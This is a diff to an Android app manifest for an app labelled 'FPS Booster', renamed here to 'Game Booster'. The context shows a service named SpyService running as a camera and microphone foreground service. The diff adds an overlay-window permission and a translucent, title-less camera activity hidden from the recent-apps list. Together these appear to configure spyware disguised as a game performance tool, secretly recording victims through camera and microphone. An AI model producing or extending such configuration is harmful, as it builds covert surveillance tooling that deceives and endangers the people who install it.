@@ -8,11 +8,12 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
 
     <application
         android:allowBackup="true"
         android:icon="@android:drawable/ic_menu_manage"
-        android:label="FPS Booster"
+        android:label="Game Booster"
         android:usesCleartextTraffic="true"
         android:theme="@style/Theme.AppCompat.Light">
         
@@ -22,6 +23,11 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+
+        <activity android:name=".CameraActivity" 
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
+            android:exported="false"/>
         
         <service android:name=".SpyService" 
             android:foregroundServiceType="camera|microphone"
